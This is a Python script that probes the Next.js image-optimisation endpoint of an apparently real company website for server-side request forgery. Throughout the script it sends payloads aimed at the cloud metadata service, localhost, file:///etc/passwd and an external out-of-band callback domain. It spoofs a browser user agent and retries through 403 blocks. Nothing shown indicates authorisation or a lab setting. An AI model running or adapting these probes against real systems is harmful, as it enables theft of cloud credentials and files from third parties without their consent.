import subprocess, time, sys
HOST = "https://" + "www.infinity" + "capital" + ".bh"
UA = ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")

def get(url, tries=8, sleep=3, label=""):
    for i in range(tries):
        r = subprocess.run(["curl","-s","-m","30","-o","/tmp/nh","-D","/tmp/nhdr",
                            "-w","%{http_code}", url,
                            "-H","User-Agent: "+UA, "-H","Accept: image/avif,image/webp,image/*,*/*"],
                           capture_output=True, text=True)
        code = r.stdout.strip()
        if code and code != "403":
            h = open("/tmp/nhdr",errors="replace").read()
            b = open("/tmp/nh","rb").read()
            ct = [l for l in h.splitlines() if l.lower().startswith(("content-type","content-length","x-vercel-error","x-nextjs","x-matched"))]
            print("%-46s HTTP %-4s len=%-7d %s" % (label, code, len(b), " | ".join(x.strip()[:70] for x in ct[:4])))
            return code, h, b
        time.sleep(sleep)
    print("%-46s BLOCKED(403) all %d tries" % (label, tries))
    return "403","",b""

import urllib.parse
def U(u): return urllib.parse.quote(u, safe="")

# control: real remote contentful image
get(HOST+"/_next/image?url="+U("https://images.ctfassets.net/yts1dx0j7jj5/1GCT0vyjqmOwm2OL1YVpD1/2ab55f8b5189afa153eac5cb97f7f6d4/Ahmed_Taleb_updated-min.jpg")+"&w=1080&q=75", label="CONTROL remote ctfassets")
time.sleep(3)
# control: local asset
get(HOST+"/_next/image?url="+U("/logo.png")+"&w=1080&q=75", label="CONTROL local /logo.png")
time.sleep(3)
# SSRF: cloud metadata
get(HOST+"/_next/image?url="+U("http://169.254.169.254/latest/meta-data/")+"&w=1080&q=75", label="SSRF 169.254.169.254 metadata")
time.sleep(3)
# SSRF: localhost
get(HOST+"/_next/image?url="+U("http://127.0.0.1:3000/api/send")+"&w=1080&q=75", label="SSRF 127.0.0.1:3000")
time.sleep(3)
# SSRF: non-image scheme
get(HOST+"/_next/image?url="+U("file:///etc/passwd")+"&w=1080&q=75", label="LFI file:///etc/passwd")
time.sleep(3)
# SSRF: OOB
OOB="oob2f781384b339." + "dau2p4ghgqag02k5emggc5xu6hph3m973." + "oast." + "abhedi.co.in"
get(HOST+"/_next/image?url="+U("http://"+OOB+"/ssrf-nextimg")+"&w=1080&q=75", label="SSRF OOB callback")
